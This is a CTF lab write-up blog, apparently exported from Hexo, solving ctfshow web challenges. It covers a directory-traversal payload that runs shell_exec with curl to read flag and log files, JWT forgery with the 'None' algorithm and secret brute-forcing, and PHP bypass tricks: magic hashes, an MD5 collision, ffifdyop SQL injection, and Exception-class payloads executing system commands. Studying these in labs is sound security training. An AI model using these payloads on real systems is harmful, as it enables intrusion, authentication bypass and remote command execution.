class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">         <span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">		));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>=<span class="string">&#x27;管理员请注意，下面是最近登陆失败用户：&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span>=db::<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ret</span> <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    	<span class="variable">$html</span> .=<span class="string">&#x27;------------&lt;br&gt;用户名: &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>[<span class="number">0</span>]).<span class="string">&#x27;&lt;br&gt;登陆失败时间: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">1</span>]</span><br><span class="line">    	.<span class="string">&#x27;&lt;br&gt;登陆失败IP: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">2</span>].</span><br><span class="line">    	<span class="string">&#x27;&lt;br&gt;------------&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$u</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$u</span>);</span><br><span class="line">	<span class="variable">$p</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$res</span> = db::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select username from ctfshow_users where username = &#x27;<span class="subst">$u</span>&#x27; and password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>);</span><br><span class="line">	<span class="variable">$date</span> = <span class="keyword">new</span> <span class="title class_">DateTime</span>(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">	<span class="variable">$now</span> = <span class="variable">$date</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$res</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"> 		 db::<span class="title function_ invoke__">insert</span>(<span class="string">&quot;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values (&#x27;<span class="subst">$u</span>&#x27;,&#x27;<span class="subst">$now</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>);</span><br><span class="line">		 <span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;账号或密码错误&#x27;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">auth</span>())&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;AuthKey 错误&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag_660&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$auth</span>==AUTH_KEY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span>  FLAG_657;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$f</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>)).<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="variable">$result</span> = FLAG_658;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$m</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;getFlag&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;testFile&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">testFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment"># code...</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;请先登陆&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后来环境重开了，网段改变了，注意一下</p>
<p>存在目录穿越漏洞</p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230601170949.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;curl http://172.2.132.5/public../FLAG/flag659.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>访问日志文件，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.238.5/public../var/log/nginx/</span><br><span class="line">ctfshow_web_access_log_file_you_never_know.log&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?action=login&amp;u=admin&amp;p=nE7jA5m&amp;flag=flag_660_ctfshow&#123;23e56d95b430de80c7b5806f49a14a2b&#125;</span><br></pre></td></tr></table></figure>

<p>剩下的学习一下，再写吧</p>
]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2023/03/15/ctfshow%E5%90%88%E9%9B%86-jwt/</url>
    <content><![CDATA[<p>   ctfshow jwt</p>
<p>​    <span id="more"></span></p>
<p>jwt和cookie都是成功登录后服务器端返回客户端的一段数据， 下次登录时避免重新输入账号密码之类，提高用户体验<br>cookie本身不具有危害性，但是通过其他手段xss等获取到对方相关网站的cookie后，即可实现免密码登录，<br>jwt由于加密的特殊性可能会造成越权登录，越权修改等危害<br>jwt语句很好辨认，主要有三部分组成，前两部分由base64加密，最后一段为key加密(可以理解为md5加盐加密)，中间使用点.截断，并且前两位字符为ew（{），一般存在于请求包（返回包）中的cookie属性值中<br><a href="https://blog.csdn.net/qq_54030686/article/details/122550173">https://blog.csdn.net/qq_54030686/article/details/122550173</a></p>
<p>jwt由三部分组成<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>、payload、signature</p>
<p>jwt解密网站<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;jwt&quot;</span><br><span class="line">&#125;</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1678972257,</span><br><span class="line">    &quot;exp&quot;: 1678979457,</span><br><span class="line">    &quot;nbf&quot;: 1678972257,</span><br><span class="line">    &quot;sub&quot;: &quot;user&quot;,  //修改为admin</span><br><span class="line">    &quot;jti&quot;: &quot;9cf456cedd0952af77d1abc40b53c4da&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>bp抓url&#x2F;admin的包得到cookie值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line">标准中注册的声明 (建议但不强制使用) </span><br><span class="line"># iss: jwt签发者</span><br><span class="line"># sub: jwt所面向的用户</span><br><span class="line"># aud: 接收jwt的一方</span><br><span class="line"># exp: jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line"># nbf: 定义在什么时间之前，该jwt都是不可用的</span><br><span class="line"># iat: jwt的签发时间</span><br><span class="line"># jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</span><br></pre></td></tr></table></figure>

<p>后base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJqd3QiCn0KWwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2Nzg5NzIyNTcsCiAgICAiZXhwIjogMTY3ODk3OTQ1NywKICAgICJuYmYiOiAxNjc4OTcyMjU3LAogICAgInN1YiI6ICJhZG1pbiIsICAKICAgICJqdGkiOiAiOWNmNDU2Y2VkZDA5NTJhZjc3ZDFhYmM0MGI1M2M0ZGEiCiAgfQpd</span><br></pre></td></tr></table></figure>

<p>发送</p>
<p>ctfshow{0f11af98-e3f2-4f85-b8f6-1a6e5e29e8ab}</p>
<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>密码是123456</p>
<p>ctfshow{d0771945-aa69-41d1-97b2-5560debfa46f}</p>
<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>同上</p>
<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>c-jwt-cracker使用</p>
<p>“alg”: “HS256”,为对称加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmNhNmQ2N2YzOGI0YWM0MmFhMThiMTA0NTcwMjNmNCJ9.PO3xD4-JJArJXohbOhKr93x8exeCRFMg8XV8yGYGZSE</span><br></pre></td></tr></table></figure>

<p>爆破出来密码为aaab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6ImFkbWluIiwianRpIjoiNWZjYTZkNjdmMzhiNGFjNDJhYTE4YjEwNDU3MDIzZjQifQ.psZF-TG9DIQKj_GHhyHGXwoGITOJI7Lhf3vP9n2iyRA</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/brendan-rius/c-jwt-cracker">GitHub - brendan-rius&#x2F;c-jwt-cracker：用 C 编写的 JWT 蛮力破解器</a></p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p>具体安装看ubuntu</p>
<p>ctfshow{138f48e1-f877-49fe-938f-94e0143ec751}</p>
<h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2>]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2023/01/09/ctfshow%E5%90%88%E9%9B%86-php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/25/509de9738d300c56.png"></p>
<span id="more"></span>

<h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><p><a href="https://www.php.net/">https://www.php.net/</a></p>
<p><strong>在PHP中，0&#x3D;&#x3D;&#x3D;FALSE是错误的</strong></p>
<p><a href="https://wangwl.net/static/projects/visualRegex/#flags=i">正则表达式可视化-Visual Regexp：在线测试、学习、构建正则表达式 (wangwl.net)</a></p>
<h2 id="匹配公式语法"><a href="#匹配公式语法" class="headerlink" title="匹配公式语法"></a>匹配公式语法</h2><table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
<p><a href="http://sai2.game178.cn/index.php/index/index/view/id/8">http://sai2.game178.cn/index.php/index/index/view/id/8</a></p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>直到遇上数字或正负符号才开始做转换，再遇到非数字或<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>结束时，结束转换</p>
<p>intval($id)会从字符串$id的起始位置开始去数字碰到非数字就结束,当起始位置为非数字时则为0。<br>比如<br>intval(‘100a123’)&#x3D;100<br>intval(‘a123’)&#x3D;0</p>
<p><code>?id=&#39;1000&#39; //&quot;1000&quot;或(1000)皆可 ?id=125&lt;&lt;3 //左移 ?id=680|320 //按位或 ?id=992^8 //按位异或 ?id=~~1000 //两次取反 ?id=0x3e8 //十六进制 ?id=0b1111101000 //二进制</code></p>
<p><code>?id=(1000)</code>以及+-*&#x2F;运算</p>
<h2 id="x3D-x3D-绕过"><a href="#x3D-x3D-绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h2><p>PHP比较运算符 &#x3D;&#x3D;在进行比较的时候是弱类型比较，只需要比较两个值相等就行，不会比较类型</p>
<p>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;绕过<br>PHP比较运算符 &#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。只要两边字符串类型不同会返回false</p>
<p>绕过方法：使用数组绕过</p>
<p>if($_GET[‘name’] !&#x3D; $_GET[‘password’]){</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2</p>
<p>PHP中md5()函数无法处理数组（会返回NULL）</p>
<p>md5值相等bp抓包传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;的也可以用数组绕过</p>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>16进制绕过</p>
<p>空字符%00 或者%20</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>数值%20</p>
</li>
<li><p>%00数值</p>
</li>
<li><p>数值%00</p>
</li>
</ol>
<h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p>
<p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66 ]  !r,  b</code></p>
<p>用途：</p>
<p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’</p>
<p>就相当于select * from admin where password&#x3D;’’or 1 实现sql注入</p>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><p>**ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
<p>①%00截断及遇到%00则默认为字符串的结束</p>
<p>  ②当ntf为数组时它的返回值不是FALSE</p>
<p>web108</p>
<p>payload :  c&#x3D;a%00778  </p>
<h2 id="异常处理类"><a href="#异常处理类" class="headerlink" title="异常处理类"></a>异常处理类</h2><p>web109</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>体来说，该语句使用了 PHP 中的 “变量函数” 语法，其中 $v1 是一个变量，包含一个类名，$v2 是一个变量，包含参数值。该语句的执行将创建一个新的 $v1 类的实例，并将 $v2 的值作为参数传递给 $v1 类的构造函数。</p>
<p>例如，假设 $v1 包含类名 MyClass，$v2 包含参数值 “hello”，则执行该语句将创建一个新的 MyClass 对象实例，并调用 MyClass 的构造函数，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line">$obj = new MyClass(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>

<p>请注意，如果 $v1 中包含的类名不存在或无法访问，则会引发一个致命错误。同样，如果 $v1 类没有定义构造函数或构造函数需要不同数量或类型的参数，则也会引发一个错误。</p>
<p>Exception是一个内置类，用于表示程序运行时出现的异常情况。可以通过抛出（throw）异常来指示程序中的错误或问题，然后通过捕获（catch）异常来处理它们。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception();system(&quot;ls&quot;);&amp;v2=a</span><br><span class="line">?v1=Exception();system(&quot;tac%09fl36dg.txt&quot;);&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br><span class="line">?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);&amp;v2=a</span><br></pre></td></tr></table></figure>

<p>从而实现命令执行</p>
<h2 id="FilesystemIterator类读取-文件"><a href="#FilesystemIterator类读取-文件" class="headerlink" title="FilesystemIterator类读取 文件"></a>FilesystemIterator类读取 文件</h2><p>web110</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
<p>通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径</p>
